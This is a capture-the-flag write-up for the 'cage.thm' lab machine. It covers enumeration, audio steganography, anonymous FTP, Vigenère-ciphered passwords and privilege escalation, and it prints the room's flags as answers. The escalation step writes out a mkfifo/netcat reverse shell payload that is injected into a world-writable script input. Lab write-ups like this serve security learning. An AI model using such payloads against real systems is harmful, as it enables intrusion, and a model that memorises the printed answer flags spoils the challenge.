# Break Out The Cage

## Intro

We are given a CTF machine named **cage.thm**. Enumeration reveals multiple services, leading to exploitation of weak configurations, ciphers, and privilege escalation to root.

---

## Nmap

Command used:

```bash
nmap -p- -sC -sV cage.thm
```

Results:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

We have **FTP, SSH, and HTTP**.

---

## Website Enumeration

Visiting the website:
<img width="944" height="773" alt="Screenshot From 2025-08-27 21-52-48" src="https://github.com/user-attachments/assets/d68215d7-a767-45c1-8a3a-0b7345a44eec" />

It’s a personal “diary” site. The `/scripts/` path is empty, so we perform directory enumeration and discover:

```
200 - /images/
200 - /html/
200 - /scripts/
200 - /contracts/
200 - /auditions/
```

In `/auditions/`, we find an MP3 file:

```
must_practice_corrupt_file.mp3
```

Download:

```bash
wget http://cage.thm/auditions/must_practice_corrupt_file.mp3 -O must_practice_corrupt_file.mp3
```

Analyzing the spectrogram of the audio file reveals the word:

```
namelesstwo
```

<img width="1856" height="973" alt="Screenshot From 2025-08-27 22-29-44" src="https://github.com/user-attachments/assets/fe4bf1ec-2e52-4bf7-958f-fc20aab4ce00" />

---

## FTP Access

With the hint about Weston setting up FTP, we try anonymous login:

```bash
ftp cage.thm
Name: anonymous
Password: [blank]
```

Success! We see a file `dad_tasks`.

Contents are base64-encoded → decoding reveals jumbled text.

Decoded snippet:

```
Qapw Eekcl - Pvr RMKP...  
```

Trying ciphers, we find the **Vigenère cipher (Variant Beaufort)** works with the key from the MP3.

Decrypted text:

```
Dad's Tasks – The RAGE... THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.
```

At the bottom is the first flag (Weston’s password):

```
Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

> Q1: First flag (Weston password)
> A1: Mydadisghostrideraintthatcoolnocausehesonfirejokes

Login:

```bash
ssh weston@IP
```

---

## Privilege Escalation to Cage

Checking sudo privileges, we see a strange message broadcast.

We find a script:

```python
/opt/.dads_scripts/spread_the_quotes.py
```

It reads from `.quotes` and executes content with `os.system()`. The `.quotes` file is writable by all users.

Exploit by adding a reverse shell payload:

```bash
echo "Test; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> 1234 >/tmp/f" > /opt/.dads_scripts/.files/.quotes
```

Start a listener:

```bash
nc -lvnp 1234
```

After a minute, we get a shell as `cage`.

Upgrade shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## User Flag

Inside `/home/cage/Super_Duper_Checklist`:

```
THM{M37AL_0R_P3N_T35T1NG}
```

> Q2: User flag
> A2: THM{M37AL\_0R\_P3N\_T35T1NG}

---

## Root Escalation

Exploring email backups, Cage’s agent Sean is mentioned. A ciphered note hints at another Vigenère cipher using the keyword **face**.

Decrypting gives root’s password:

```
cageisnotalegend
```

Login as root:

```bash
su root
Password: cageisnotalegend
```

Reading root’s emails reveals the final flag:

```
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```

> Q3: Root flag
> A3: THM{8R1NG\_D0WN\_7H3\_C493\_L0N9\_L1V3\_M3}

---

## Conclusion

* Enumerated FTP, SSH, and HTTP.
* Found audio steganography hint → Vigenère cipher → Weston’s SSH password.
* Exploited writable `.quotes` file in `spread_the_quotes.py` to escalate to Cage.
* Used another cipher with keyword “face” to get root password.
* Retrieved both user and root flags.

---
